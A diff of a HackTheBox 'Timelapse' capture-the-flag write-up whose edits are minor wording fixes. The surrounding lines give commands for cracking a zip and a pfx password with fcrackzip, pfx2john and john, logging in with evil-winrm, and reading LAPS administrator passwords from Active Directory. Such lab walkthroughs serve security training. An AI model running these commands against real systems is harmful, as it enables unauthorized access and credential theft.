@@ -40,7 +40,7 @@ Extracting the zipfile requires a password. We can use ```7z``` to get more info
 <img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Timelapse/assets/3.png">
 
 
-We can try to crack the password using ```john``` or ```fcrackzip```. In this case i chose the latter.
+We can try to crack the password using ```john``` or ```fcrackzip```. In this case I chose the latter.
 
 ```
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
@@ -59,7 +59,7 @@ I had to update ```john``` in order to have ```pfx2john``` available and run the
 pfx2john legacy_dev_auth.pfx > hash
 ```
 
-And pass it along to john:
+And pass it along to ```john```:
 
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt hash    
@@ -67,7 +67,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 
 <img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Timelapse/assets/6.png">
 
-We have cracked the password using the rockyou wordlist. I found [documentation](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file) how one could extract the private key and certificate from a pfx file.
+We have cracked the password using the rockyou wordlist. I found [documentation](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file) how one can extract the private key and certificate from a pfx file.
 
 Extract the private key:
 
@@ -77,7 +77,7 @@ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacy.key -nodes
 
 <img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Timelapse/assets/7.png">
 
-And we do the same to extract the certificate:
+And we do the same for the certificate:
 
 ```
 openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacy.crt 
@@ -92,7 +92,7 @@ evil-winrm -S -k legacy.key -c legacy.crt -i 10.10.11.152
 <img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Timelapse/assets/8.png">
 
 # Lateral Movement
-We are unable to use ```winPEAS``` because Microsoft Defender is blocking the file. Using an obfuscated version didn't help either. After further enumerating the host for the usual ways for privilege escalation i was unable to find anything useful. I got some help pointing me in the right direction and found the Powershell history file:
+We are unable to use ```winPEAS``` because Microsoft Defender is blocking the file. Using an obfuscated version didn't help either. After further enumerating the host for the usual ways for privilege escalation I was unable to find anything useful. I tried eunning Powershell scripts but without any luck. I got some help pointing me in the right direction and found the Powershell history file:
 
 <img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Timelapse/assets/9.png">
 
@@ -117,7 +117,7 @@ invoke-command -computername localhost -credential $c -port 5986 -usessl -Sessio
 
 
 # Privilege Escalation
-We see that this user is member of the ```LAPS_Readers``` group which is useful to us because we can probably extract the local administrator password. We can check for this by using the ```AD-Module```.
+We see that this user is member of the ```LAPS_Readers``` group which is useful to us because we can probably extract the local administrator password. We can check this by using the ```AD-Module```.
 
 ```
 invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}
